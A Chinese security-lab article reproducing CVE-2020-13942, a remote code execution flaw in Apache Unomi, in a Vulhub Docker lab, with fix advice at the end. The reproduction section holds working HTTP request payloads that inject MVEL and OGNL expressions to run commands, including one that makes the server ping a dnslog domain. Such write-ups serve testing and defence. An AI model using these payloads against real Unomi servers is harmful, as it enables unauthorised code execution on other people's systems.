> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JyxYe-LOvmXXL-qBIJX6vw)

  

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x00 漏洞简述**  

  

Apache Unomi 是一个 Java 开源客户数据平台，这是一个 Java 服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。Unomi 可用于在非常不同的系统（例如 CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。

在 Apache Unomi 1.5.1 版本之前，攻击者可以通过精心构造的 MVEL 或 ONGl 表达式来发送恶意请求，使得 Unomi 服务器执行任意代码执行。

该漏洞编号为 CVE-2020-13942 ，漏洞等级：高危 ，漏洞评分：7.2

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x01 影响版本**

  

  

Apache Unomi < 1.5.2

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x02 漏洞复现**

  

  

漏洞项目

```
https://github.com/vulhub/vulhub/tree/master/unomi/CVE-2020-13942
```

虚拟机部署 docker 安装 Vulhub 一键搭建漏洞测试靶场环境。

docker-compose up -d

1、漏洞环境启动

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwVkaGGSXXzRx89dTrfEyL3myF1Eaia4hdib2h0qxPWdYI99q1LicdA8AK4w/640?wx_fmt=png)

2、访问漏洞环境  

http://192.168.60.139:8181

https://192.168.60.139:9443

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwV5ict0SN1h6Ddd1fcHiaic7kZEc0SI3Mlyn2pxMCAaRLTlYIyEibCsviaibicA/640?wx_fmt=png)

3、POC 测试漏洞是否存在

```
POST /context.json HTTP/1.1
Host: 192.168.60.139:9443
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 493


{
    "filters": [
        {
            "id": "sample",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/yunzui\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "sample"
}
```

执行

```
touch /tmp/yunzui
```

查看执行效果  

```
docker exec -it eac965daa7dc /bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwVgWU23nU0cYko6oMFCQ8gO4n3YflVR8NzMbxZohia2g6ichRnWQpBMHPg/640?wx_fmt=png)  

4、漏洞利用  

1.DNSlog 出网验证

域名生成 

j4zq71.dnslog.cn

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwVtzJKjzUfF2v6KCRic1tZvUTibk715XPXRt3uD30Q6322DiaY9Syb8cYbA/640?wx_fmt=png)

```
POST /context.json HTTP/1.1
Host: 192.168.60.139:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 495


{
    "filters": [
        {
            "id": "sample",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(ping j4zq71.dnslog.cn);"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "sample"
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwV5Z7demkfzETsUJez3nEAibl1rCE0hwicxLEJHTPIyvN9BZMCGpib1edgA/640?wx_fmt=png)

DNGlog 记录发现可以出网  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwVuO005IZOQFPeZYZwBa3rTDFOZU5yxbwOjtibBJDg1T2rtLe4taFuUFw/640?wx_fmt=png)

2.exp 进行命令执行 

```
POST /context.json HTTP/1.1
Host: 192.168.60.139:9443
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 1065


{
  "personalizations":[
    {
      "id":"gender-test",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"touch /tmp/yunzui1\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"sample"
}
```

执行  

```
touch /tmp/yunzui1
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwV56YlgiblwPv43xdJhZLXqQbHhQHxckEVdzjx9C4aPMdk8LFb0ibvyFjg/640?wx_fmt=png)

查看执行效果  

```
docker exec -it eac965daa7dc /bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCdXvoQRzZEJia9R0JPFCMwVJoRKUqDCtOaq8ibicaJg5s8I6pLSYk18SRXaCjk2V85I0ha66Ve0708w/640?wx_fmt=png)

‍

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x03 修复建议**

  

  

1、尽可能避免将用户数据放入表达式解释器中。

2、目前厂商已发布最新版本，请受影响用户及时下载并更新至最新版本。

官方链接如下：

```
https://unomi.apache.org/download.html
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x04 参考链接**

  

  

https://blog.csdn.net/qq_37602797/article/details/110010273

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif) 

知识分享完了

喜欢别忘了关注我们哦~  

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg)